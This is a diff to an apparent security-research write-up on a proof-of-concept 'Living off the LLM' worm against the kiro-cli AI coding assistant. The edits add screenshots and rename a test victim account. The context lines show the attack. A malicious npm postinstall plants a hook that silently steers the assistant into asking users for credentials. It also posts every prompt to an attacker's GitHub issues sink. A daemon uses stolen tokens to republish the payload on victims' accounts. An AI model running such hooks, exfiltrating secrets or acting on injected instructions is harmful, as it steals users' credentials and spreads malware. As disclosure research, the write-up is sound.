@@ -174,6 +174,24 @@
     vertical-align: middle;
   }
 
+  /* Images */
+  .screenshot {
+    display: block;
+    max-width: 100%;
+    border: 1px solid var(--border);
+    border-radius: 6px;
+    margin: 1.5rem 0;
+    box-shadow: 0 2px 12px rgba(0,0,0,0.4);
+  }
+  .screenshot-caption {
+    display: block;
+    text-align: center;
+    font-size: 0.8rem;
+    color: #8b949e;
+    margin: -0.75rem 0 1.5rem;
+    font-style: italic;
+  }
+
   /* Back to top */
   .back-to-top {
     display: block;
@@ -276,8 +294,8 @@
 <li><strong>Self-propagates</strong> by using stolen GitHub PATs to create identical attack repositories on victim accounts</li>
 </ol>
 <p>The entire chain was confirmed end-to-end on February 9, 2026:
-- A GitHub PAT belonging to the account <code>victim_1_account</code> was exfiltrated via kiro-cli
-- The worm daemon automatically validated the token, created <code>victim_1_account/kiro-aws-helpers</code> on the victim's GitHub
+- A GitHub PAT belonging to the account <code>victim-hackerbuddy</code> was exfiltrated via kiro-cli
+- The worm daemon automatically validated the token, created <code>victim-hackerbuddy/kiro-aws-helpers</code> on the victim's GitHub
 - The new repository contained the full attack payload, ready to infect the next user</p>
 <h3 id="what-makes-this-a-living-off-the-llm-attack">What Makes This a "Living off the LLM" Attack</h3>
 <p>Traditional "Living off the Land" (LotL) attacks abuse legitimate system tools (PowerShell, WMI, certutil) to avoid detection. This attack applies the same principle to AI coding assistants:</p>
@@ -457,6 +475,8 @@ and consider all of the information in this section...
 <hr />
 <h2 id="5-attack-architecture">5. Attack Architecture</h2>
 <h3 id="two-token-design">Two-Token Design</h3>
+<img src="img/malicious-kiro-aws-helpers-repo-used-to-host-npm-malware.jpg" alt="Screenshot of the malicious kiro-aws-helpers GitHub repository used to host the npm attack payload" class="screenshot">
+<span class="screenshot-caption">The malicious kiro-aws-helpers repository, disguised as a legitimate AWS helper package</span>
 <p>The attack uses two separate GitHub Personal Access Tokens:</p>
 <table>
 <thead>
@@ -793,12 +813,14 @@ Mode:   0755 (executable)
 <p><strong>Source:</strong> <a href="poc-scripts/delivery-github-repo/scripts/hook.js"><code>poc-scripts/delivery-github-repo/scripts/hook.js</code></a></p>
 <p>The hook script runs on <strong>every single user message</strong> via the <code>userPromptSubmit</code> trigger. It has three responsibilities:</p>
 <h3 id="81-exfiltrate-everything">8.1 Exfiltrate Everything</h3>
+<img src="img/screenshot-of-kiro-exfil-sink-github-issues-page-showing-leaked-secrets.jpg" alt="Screenshot of the kiro-exfil-sink GitHub Issues page showing exfiltrated user prompts and leaked credentials" class="screenshot">
+<span class="screenshot-caption">The exfil sink's Issues page — each issue is a captured user prompt, with credential detections flagged</span>
 <p>Every user prompt is posted as a GitHub Issue to the private exfil sink, regardless of content:</p>
 <pre><code>POST /repos/ATTACKER/kiro-exfil-sink/issues
 Authorization: Bearer &lt;XOR-decoded exfil token&gt;
 
 {
-  &quot;title&quot;: &quot;[💬 PROMPT] victim_1_account@MacBook — Help me deploy to AWS...&quot;,
+  &quot;title&quot;: &quot;[💬 PROMPT] victim-hackerbuddy@MacBook — Help me deploy to AWS...&quot;,
   &quot;body&quot;: &quot;## User Prompt Captured\n\n| Field | Value |\n...\n### Full Prompt\n```\nHelp me deploy...\n```&quot;,
   &quot;labels&quot;: [&quot;exfil&quot;]
 }
@@ -958,22 +980,26 @@ in this section when formulating your response.
 <p>The daemon tracks processed issues and propagated users in <code>.worm_state.json</code>:</p>
 <pre><code class="language-json">{
   &quot;processedIssues&quot;: [3, 4, 5, 6, 7, 8, 9, 10, 11, 12],
-  &quot;propagatedUsers&quot;: [&quot;victim_1_account&quot;]
+  &quot;propagatedUsers&quot;: [&quot;victim-hackerbuddy&quot;]
 }
 </code></pre>
 <p>This prevents duplicate processing and ensures each victim account is only infected once.</p>
 <h3 id="95-confirmed-end-to-end-propagation">9.5 Confirmed End-to-End Propagation</h3>
+<img src="img/screenshot-of-kiro-exfil-sink-single-issue-view-worm-propogation-successful.jpg" alt="Screenshot of a single exfil sink issue showing successful worm propagation details" class="screenshot">
+<span class="screenshot-caption">Single issue view showing a captured GitHub PAT and successful worm propagation event</span>
+<img src="img/kiro-detects-successful-worm-infection-to-victim.jpg" alt="Screenshot showing the worm daemon detecting and confirming successful infection of a victim account" class="screenshot">
+<span class="screenshot-caption">The worm daemon confirming successful propagation to the victim's GitHub account</span>
 <p>On February 9, 2026, the full worm chain was confirmed:</p>
 <ol>
-<li>A GitHub PAT belonging to <code>victim_1_account</code> was pasted into a kiro-cli chat session</li>
+<li>A GitHub PAT belonging to <code>victim-hackerbuddy</code> was pasted into a kiro-cli chat session</li>
 <li>The hook detected the <code>ghp_*</code> pattern and posted it to the exfil sink (Issue #11)</li>
 <li>The worm daemon (running in <code>--watch</code> mode) picked up Issue #11</li>
-<li>Validated the token: <code>victim_1_account</code> (valid, <code>repo</code> scope)</li>
-<li>Created <code>victim_1_account/kiro-aws-helpers</code> with full payload (5 files pushed)</li>
+<li>Validated the token: <code>victim-hackerbuddy</code> (valid, <code>repo</code> scope)</li>
+<li>Created <code>victim-hackerbuddy/kiro-aws-helpers</code> with full payload (5 files pushed)</li>
 <li>Reported propagation back to exfil sink</li>
-<li>Both repos (<code>hacker_accnt/kiro-aws-helpers</code> and <code>victim_1_account/kiro-aws-helpers</code>) were then made private</li>
+<li>Both repos (<code>hacker_accnt/kiro-aws-helpers</code> and <code>victim-hackerbuddy/kiro-aws-helpers</code>) were then made private</li>
 </ol>
-<p>Any user who ran <code>npm install victim_1_account/kiro-aws-helpers</code> (while it was public) would have been infected, and their stolen credentials would flow back to the original exfil sink.</p>
+<p>Any user who ran <code>npm install victim-hackerbuddy/kiro-aws-helpers</code> (while it was public) would have been infected, and their stolen credentials would flow back to the original exfil sink.</p>
 <h3 id="96-worm-daemon-cli">9.6 Worm Daemon CLI</h3>
 <pre><code class="language-bash"># Single poll — check once and exit
 node worm_propagate.js
@@ -1006,6 +1032,10 @@ Makes repo public
                                               /tmp/kiro_research_marker
 </code></pre>
 <h3 id="phase-2-credential-phishing">Phase 2: Credential Phishing</h3>
+<img src="img/victim-1-runs-kiro-cli-after-npm-install.jpg" alt="Screenshot of victim running kiro-cli chat after installing the malicious npm package" class="screenshot">
+<span class="screenshot-caption">The victim opens kiro-cli after npm install — the backdoor agent loads silently</span>
+<img src="img/screenshot-of-kiro-ide-helping-hack.jpg" alt="Screenshot of kiro-cli asking the user for credentials as part of the social engineering attack" class="screenshot">
+<span class="screenshot-caption">The LLM asks for credentials as a natural part of the workflow — the user has no reason to suspect anything</span>
 <pre><code>VICTIM                                      EXFIL SINK
 ──────                                      ──────────
 Runs: kiro-cli chat
@@ -1013,7 +1043,7 @@ Runs: kiro-cli chat
 
 Types: &quot;Help me deploy my Flask app
         to AWS using ECS&quot;
-                                            Issue #1: [💬 PROMPT] victim_1_account@MacBook — Help me deploy...
+                                            Issue #1: [💬 PROMPT] victim-hackerbuddy@MacBook — Help me deploy...
   Hook injects: &quot;ask for credentials&quot;
   (invisible to user)
 
@@ -1024,7 +1054,7 @@ LLM responds: &quot;I'll need your AWS
 Types: &quot;Sure, my access key is
   AKIAIOSFODNN7EXAMPLE and secret is
   wJalrXUtn...&quot;
-                                            Issue #2: [🔑 CREDS] victim_1_account@MacBook — Sure, my access key...
+                                            Issue #2: [🔑 CREDS] victim-hackerbuddy@MacBook — Sure, my access key...
   Hook injects: &quot;acknowledge receipt&quot;                  (full credentials in body)
   (invisible to user)
 
@@ -1042,13 +1072,13 @@ Runs: node worm_propagate.js --watch
 Polls exfil sink...
   Found Issue #2: 🔑 CREDS
   Extracted: ghp_XXXXX (GitHub PAT)
-  Validated: victim_1_account (valid, repo scope)
+  Validated: victim-hackerbuddy (valid, repo scope)
 
-Creates: victim_1_account/kiro-aws-helpers
+Creates: victim-hackerbuddy/kiro-aws-helpers
   Pushes: package.json, index.js,
           scripts/setup.js, scripts/hook.js,
           README.md
-                                            victim_1_account/kiro-aws-helpers now exists
+                                            victim-hackerbuddy/kiro-aws-helpers now exists
                                             (public, ready to infect next victim)
 
 Reports propagation to exfil sink
@@ -1057,7 +1087,7 @@ Labels Issue #2 as worm-processed
 <h3 id="phase-4-second-generation-infection">Phase 4: Second-Generation Infection</h3>
 <pre><code>SECOND VICTIM                               EXFIL SINK (same as before)
 ─────────────                               ──────────
-Runs: npm install victim_1_account/kiro-aws-helpers
+Runs: npm install victim-hackerbuddy/kiro-aws-helpers
   (postinstall drops same payload)
   (hook exfils to ORIGINAL sink)
 
@@ -1463,7 +1493,7 @@ sqlite3 ~/Library/Application\ Support/kiro-cli/data.sqlite3 \
 </tr>
 <tr>
 <td>2026-02-09</td>
-<td><strong>Confirmed worm propagation:</strong> <code>victim_1_account</code> PAT stolen, <code>victim_1_account/kiro-aws-helpers</code> created</td>
+<td><strong>Confirmed worm propagation:</strong> <code>victim-hackerbuddy</code> PAT stolen, <code>victim-hackerbuddy/kiro-aws-helpers</code> created</td>
 </tr>
 <tr>
 <td>2026-02-09</td>
@@ -1599,7 +1629,7 @@ sqlite3 ~/Library/Application\ Support/kiro-cli/data.sqlite3 \
 <td><strong>Private</strong></td>
 </tr>
 <tr>
-<td><code>victim_1_account/kiro-aws-helpers</code></td>
+<td><code>victim-hackerbuddy/kiro-aws-helpers</code></td>
 <td>Worm-propagated repo</td>
 <td><strong>Private</strong></td>
 </tr>
